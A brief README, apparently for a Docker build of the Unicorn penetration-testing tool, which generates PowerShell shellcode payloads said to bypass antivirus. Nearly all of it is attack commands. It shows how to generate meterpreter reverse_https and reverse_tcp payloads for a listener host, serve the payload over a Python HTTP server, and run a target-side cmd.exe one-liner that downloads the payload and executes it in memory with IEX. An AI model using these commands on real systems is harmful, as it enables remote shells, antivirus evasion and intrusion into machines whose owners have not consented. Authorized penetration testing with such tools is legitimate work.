#### 1. About

- URL: `https://github.com/trustedsec/unicorn`
- Run shellcode straight from memory via PowerShell (can bypass AV)


#### 2. Build
```
# docker build -t unicorn .
```


#### 3. Example

Local:
```
# docker run --rm -it -v /tmp:/tmp -p4000:4000 unicorn windows/meterpreter/reverse_https 192.168.9.11 4000
...
# docker run --rm -it -v /tmp:/tmp -p4000:4000 unicorn windows/shell/reverse_tcp 192.168.9.11 4000
# cd /tmp/ && python -m SimpleHTTPServer 4001
```
Note: payload will be placed under `/tmp/payload`

Target:
```
C:\>cmd.exe /C echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.9.11:4001/payload') | powershell -noprofile -
```
